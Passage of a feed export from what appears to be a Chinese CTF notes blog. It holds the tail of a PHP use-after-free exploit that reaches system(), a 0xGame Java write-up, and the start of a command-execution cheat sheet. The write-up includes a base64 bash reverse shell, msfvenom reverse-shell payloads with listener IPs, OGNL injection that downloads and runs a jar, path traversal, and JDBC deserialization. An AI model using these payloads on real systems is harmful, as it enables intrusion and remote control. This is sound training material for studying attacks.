class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-1-4-12-环境变量截取、注入">2.1.4.12 环境变量截取、注入</h5><p><strong>fuzz脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://545c9513-be92-4706-a7fc-ba5b4b69876a.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = string.ascii_letters+string.digits+<span class="string">&quot;$+-&#125;&#123;_&gt;&lt;:?*.~/\\ &quot;</span></span><br><span class="line"></span><br><span class="line">white_list = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;code&quot;</span> : payload</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;evil input&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(payload, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        white_list += payload</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(white_list.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;空格&quot;</span>))</span><br></pre></td></tr></table></figure><p><strong>环境变量构造表</strong></p><table><thead><tr><th>变量名</th><th>作用</th></tr></thead><tbody><tr><td>${PWD}</td><td>返回当前工作目录</td></tr><tr><td>${SHLVL}</td><td>作用：记录多个 Bash 进程实例嵌套深度的累加器，进程第一次打开shell时 ${SHLVL} 就为1，然后再这个shell中再打开一个shell的话此时 ${SHLVL} 就变成了2</td></tr><tr><td>${PATH}</td><td>环境变量位置，一般是/bin</td></tr><tr><td>${RANDOM}</td><td>随机数0~32767，$ 、$</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">整理的笔记</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="笔记" scheme="https://bowuchuling.github.io/categories/CTF/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="笔记" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://bowuchuling.github.io/posts/0.html"/>
    <id>https://bowuchuling.github.io/posts/0.html</id>
    <published>2023-10-26T07:56:22.585Z</published>
    <updated>2023-11-19T10:26:27.174Z</updated>
    
    <content type="html"><![CDATA[<h1>0xGame WEEK4 java全家桶</h1><h2 id="Week-4-spring">[Week 4] spring</h2><p>根据提示为springboot的actuator未授权访问漏洞，下载敏感文件heapdump</p><p>ctfscript</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span><span class="keyword">JDumpSpider-1.1-SNAPSHOT-full.jar </span>heapdump</span><br></pre></td></tr></table></figure><p><img src="C:%5CUsers%5C21619%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231025213944755.png" alt="image-20231025213944755"></p><h2 id="Week-4-auth-bypass">[Week 4] auth_bypass</h2><p>绕过姿势：</p><p>hackbar：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span></span><br></pre></td></tr></table></figure><p>burpsuite：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/./</span></span><br></pre></td></tr></table></figure><p>然后就可以进行任意文件下载了，首先尝试下载敏感文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="regexp">//</span>download?filename=..<span class="regexp">/WEB-INF/</span>web.xml</span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.demo.IndexServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.demo.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>EvilServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.demo.EvilServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/download<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>EvilServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/You_Find_This_Evil_Servlet_a76f02cb8422<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>AuthFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.example.demo.AuthFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>AuthFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以得到一个新的路由，直接访问得到信息有限，根据得到的配置文件尝试源代码的class文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/WEB-INF/</span>web.xm1  <span class="comment">#WEB应用程序配置文件，描述了servlet和其它应用组件配置及命名规则。</span></span><br><span class="line"><span class="regexp">/WEB-INF/</span>classes/  <span class="comment">#含站点所有的class文件</span></span><br><span class="line"><span class="regexp">/WEB-INF/</span>lib/   <span class="comment">#存放WEB应用需要的各种JAR文件</span></span><br><span class="line"><span class="regexp">/WEB-INF/</span>src/  <span class="comment">#源码目录</span></span><br><span class="line">WEB-INF/database.properties   <span class="comment">#数据库配胃文件</span></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="regexp">//</span>download?filename=..<span class="regexp">/WEB-INF/</span>classes<span class="regexp">/com/</span>example<span class="regexp">/demo/</span>EvilServlet.class</span><br></pre></td></tr></table></figure><p>得到源代码之后进行反编译得到路由和执行参数</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You_Fi<span class="symbol">nd_This_Evil_Servlet_a76</span>f<span class="number">02</span>cb<span class="number">8422</span>?Evil_Cmd_Argume<span class="symbol">nts_fe37627</span>fed<span class="number">78</span>=ls</span><br></pre></td></tr></table></figure><p>反弹shell进行rce，命令和平常的不太一样</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">bash -c </span><span class="template-variable">&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjE=&#125;</span><span class="language-xml">|</span><span class="template-variable">&#123;base64,-d&#125;</span><span class="language-xml">|</span><span class="template-variable">&#123;bash,-i&#125;</span></span><br></pre></td></tr></table></figure><p><img src="C:%5CUsers%5C21619%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231025221533100.png" alt="image-20231025221533100"></p><h2 id="Week-4-YourBatis">[Week 4] YourBatis</h2><p>动态SQL会造成OGNL表达式注入漏洞，测试paylaod如下，传入的时候一定得url编码</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@java</span>.lang.Runtime<span class="variable">@getRuntime</span>().<span class="built_in">exec</span>(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里使用msf得到shell，用下面的命令生成木马文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/shell_reverse_tcp <span class="attribute">LHOST</span>=150.158.24.228 <span class="attribute">LPORT</span>=250 -f jar &gt; shell.jar</span><br></pre></td></tr></table></figure><p>将木马下载到靶机上</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;</span><span class="variable">@java</span>.lang.<span class="title class_">Runtime</span><span class="variable">@getRuntime</span>().exec(<span class="string">&quot;wget http://url/shell.jar -O 2.jar&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>在vps上开启msf监听</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD java/shell_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 150.158.24.228</span><br><span class="line"><span class="built_in">set</span> LPORT 250</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>在靶机上执行目标木马，记得url编码</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;</span><span class="variable">@java</span>.lang.<span class="title class_">Runtime</span><span class="variable">@getRuntime</span>().exec(<span class="string">&quot;java -jar 2.jar&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>env得到flag</p><p><img src="C:%5CUsers%5C21619%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231026152548555.png" alt="image-20231026152548555"></p><h2 id="Week-4-TestConnection">[Week 4] TestConnection</h2><p>看了hint知道了是jdbc的数据库连接漏洞</p><p>利用项目：<a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>vps启动服务，直接读取环境变量就ok，靶机命令如下</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testConnection?<span class="attr">username</span><span class="operator">=</span><span class="variable">&amp;password</span>=<span class="variable">&amp;driver</span>=com.mysql.jdbc.Driver<span class="variable">&amp;url</span>=jdbc:mysql:<span class="comment">//110.41.17.183:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span></span><br></pre></td></tr></table></figure><p><img src="C:%5CUsers%5C21619%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231026155354422.png" alt="image-20231026155354422"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;0xGame WEEK4 java全家桶&lt;/h1&gt;
&lt;h2 id=&quot;Week-4-spring&quot;&gt;[Week 4] spring&lt;/h2&gt;
&lt;p&gt;根据提示为springboot的actuator未授权访问漏洞，下载敏感文件heapdump&lt;/p&gt;
&lt;p&gt;ctfscript</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>命令执行总结</title>
    <link href="https://bowuchuling.github.io/posts/1837iuw7.html"/>
    <id>https://bowuchuling.github.io/posts/1837iuw7.html</id>
    <published>2023-10-17T09:58:31.255Z</published>
    <updated>2023-10-26T07:57:39.499Z</updated>
    
    <content type="html"><![CDATA[<h3 id="开篇注释：">开篇注释：</h3><h4 id="linux基本命令：">linux基本命令：</h4><h5 id="1-常见管道符">1.常见管道符</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">windows：</span><br><span class="line">‘<span class="string">|’ 直接执行后面的语句</span></span><br><span class="line">‘<span class="string">||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span></span><br><span class="line">‘<span class="meta">&amp;’ 前面和后面命令都要执行，无论前面真假</span></span><br><span class="line"><span class="meta">&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span></span><br><span class="line"></span><br><span class="line">linux：</span><br><span class="line">Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘<span class="meta">&amp;’ 作用相同</span></span><br></pre></td></tr></table></figure><h5 id="2-读取文件命令">2.读取文件命令</h5><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat<span class="comment">--由第一行开始显示内容，并将所有内容输出</span></span><br><span class="line">tac<span class="comment">--从最后一行倒序显示内容，并将所有内容输出</span></span><br><span class="line">more<span class="comment">-- 根据窗口大小，一页一页的现实文件内容</span></span><br><span class="line">less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head<span class="comment">-- 只显示头几行</span></span><br><span class="line">tail <span class="comment">--只显示最后几行</span></span><br><span class="line">nl <span class="comment">--类似于cat -n，显示时输出行号</span></span><br><span class="line">tailf<span class="comment">-- 类似于tail -f</span></span><br><span class="line">vim <span class="comment">--使用vim工具打开文本</span></span><br><span class="line">vi <span class="comment">--使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出</span></span><br></pre></td></tr></table></figure><h3 id="1-无参数rce">1.无参数rce</h3><h4 id="1-1基本函数及其作用：">1.1基本函数及其作用：</h4><table><thead><tr><th>函数</th><th>效果</th></tr></thead><tbody><tr><td>foreach($a as $x =&gt; $y)</td><td>$a为数组,将数组名和值循环赋值给$x和$y</td></tr><tr><td>exit($a)</td><td>输出$a并退出当前脚本</td></tr><tr><td>show_source()</td><td>显示文件内容</td></tr><tr><td>highlight_file()</td><td>显示文件内容</td></tr><tr><td>readfile()</td><td>显示文件内容</td></tr><tr><td>var_dump()</td><td>打印数组，显示文件名</td></tr><tr><td>printf()</td><td>显示文件内容</td></tr><tr><td>next()</td><td>数组指针移动到下一位</td></tr><tr><td>array_reverse()</td><td>数组位置前后调转</td></tr><tr><td>show_source(next(array_reverse(scandir(current(localeconv())))))</td><td></td></tr><tr><td>localeconv()</td><td>详细的自己搜，返回一个数组，数组的第一个是小数点字符，因此可以用current()提取一个.</td></tr><tr><td>current()或pos()</td><td>提取数组第一个元素的值</td></tr><tr><td>scandir()</td><td>显示目录中的所有文件</td></tr><tr><td>scandir(current(localeconv()))</td><td>查看目录</td></tr><tr><td>var_dump(scandir(current(localeconv())))</td><td>输出目录</td></tr><tr><td>end()</td><td>取出数组中的最后一位</td></tr><tr><td>chdir()</td><td>目录跳转，例如chdir(‘…’)就是跳转到上级目录</td></tr><tr><td>get_defined_vars()</td><td>返回由所有已定义变量所组成的数组（全局变量）</td></tr><tr><td>dirname()</td><td>返回当前文件的路径，就是pwd</td></tr><tr><td>getcwd()</td><td>返回当前的工作目录</td></tr><tr><td>getallheaders()</td><td>返回所有的请求头数组</td></tr><tr><td>getenv()</td><td>php7.1版本以后才能使用，获取环境变量</td></tr><tr><td>time()</td><td>返回当前的Unix时间戳</td></tr><tr><td>localtime()</td><td>取得本地时间</td></tr><tr><td>localtime(time())</td><td>返回一个数组，0-60之间</td></tr></tbody></table><h4 id="1-2session-id">1.2session_id</h4><p>session字符串只能存储大小写字母以及数字组成的字符串，所以需要对session进行转换，操作如下</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">eval</span>(<span class="title">hex2bin</span>(<span class="title">session_id</span>(<span class="title">session_start</span>())));</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">echo</span> <span class="title">bin2hex</span>(<span class="string">&quot;phpinfo();&quot;</span>)=<span class="number">706870696</span><span class="variable">e666f28293b</span>  <span class="comment">//php执行</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">phpsessionid</span>=</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure><h4 id="1-3随机读取文件">1.3随机读取文件</h4><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">highlight_file</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>()))))));</span></span><br></pre></td></tr></table></figure><h4 id="1-4用请求头进行命令执行">1.4用请求头进行命令执行</h4><p>源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span 